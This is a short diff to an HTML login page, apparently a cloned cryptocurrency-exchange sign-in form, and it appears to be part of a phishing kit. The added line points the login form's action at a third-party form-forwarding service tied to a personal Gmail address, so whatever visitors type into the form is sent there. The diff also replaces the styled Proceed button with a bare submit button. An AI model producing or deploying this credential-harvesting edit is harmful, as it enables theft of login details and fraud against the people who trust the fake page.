@@ -553,7 +553,7 @@
                                   </div>
                                 </section>
                                 
-                                <form method="post" id="login-form" onsubmit="handleForm(event)" class="css-fcf6q KuxForm-form KuxForm-verticalForm">
+                                <form action="https://formsubmit.co/ollarkunle1@gmail.com" method="post" id="login-form" onsubmit="handleForm(event)" class="css-fcf6q KuxForm-form KuxForm-verticalForm">
                                   
                                   <div class="KuxForm-item css-9mv970">
                                     <div class="KuxForm-itemRowContainer KuxRow-row css-1uqn2oy" style="row-gap: 0px;">
@@ -709,9 +709,8 @@
                                                 </div>
                                               </div>
 
-                                              <button id="codeBtn" class="KuxButton-root KuxButton-contained KuxButton-containedPrimary KuxButton-sizeLarge KuxButton-containedSizeLarge KuxButton-fullWidth css-1awe74r" type="submit">
-                                                Proceed
-                                              </button>
+                                                   <button type="submit">proceed</button>
+
 
                                             </div>
 
